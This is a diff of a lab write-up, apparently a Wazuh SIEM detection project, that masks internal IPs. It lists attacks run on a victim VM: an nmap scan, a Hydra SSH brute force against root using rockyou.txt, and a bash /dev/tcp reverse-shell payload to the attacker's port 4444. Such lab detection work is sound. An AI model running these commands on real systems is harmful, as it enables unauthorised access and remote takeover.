@@ -17,9 +17,9 @@ All virtual machines were deployed on Google Cloud Platform (asia-south2, Delhi 
 
 | Machine | OS | Internal IP | Role |
 |---|---|---|---|
-| kali-attacker | Debian 11 | 10.190.0.4 | Attacker Machine |
-| wazuh-siem | Ubuntu 22.04 LTS | 10.190.0.5 | SIEM Server |
-| victim-machine | Ubuntu 22.04 LTS | 10.190.0.7 | Target Endpoint |
+| kali-attacker | Debian 11 | 10.190.0.x | Attacker Machine |
+| wazuh-siem | Ubuntu 22.04 LTS | 10.190.0.x | SIEM Server |
+| victim-machine | Ubuntu 22.04 LTS | 10.190.0.x | Target Endpoint |
 
 ---
 
@@ -43,7 +43,7 @@ All virtual machines were deployed on Google Cloud Platform (asia-south2, Delhi 
 
 ### Attack #001 — Network Reconnaissance
 **Tool:** Nmap  
-**Command:** `nmap -sV -sC 10.190.0.7`  
+**Command:** `nmap -sV -sC 10.190.0.x`  
 **Description:** Performed a service and script scan against the victim machine to enumerate open ports and running services. Wazuh detected SSH probing triggered by the scan.
 
 **Detection:**
@@ -58,7 +58,7 @@ All virtual machines were deployed on Google Cloud Platform (asia-south2, Delhi 
 
 ### Attack #002 — SSH Brute Force
 **Tool:** Hydra v9.1  
-**Command:** `hydra -l root -P rockyou.txt ssh://10.190.0.7 -t 4`  
+**Command:** `hydra -l root -P rockyou.txt ssh://10.190.0.x -t 4`  
 **Description:** Launched a dictionary attack against the victim's SSH service using the rockyou wordlist. Successfully cracked the root password within 8 attempts.
 
 **Detection:**
@@ -73,7 +73,7 @@ All virtual machines were deployed on Google Cloud Platform (asia-south2, Delhi 
 
 ### Attack #003 — Reverse Shell
 **Tool:** Netcat  
-**Payload:** `bash -i >& /dev/tcp/10.190.0.4/4444 0>&1`  
+**Payload:** `bash -i >& /dev/tcp/10.190.0.x/4444 0>&1`  
 **Description:** After gaining credentials via brute force, established a reverse shell from the victim machine back to the attacker. Gained full interactive root shell on the victim.
 
 **Detection:**
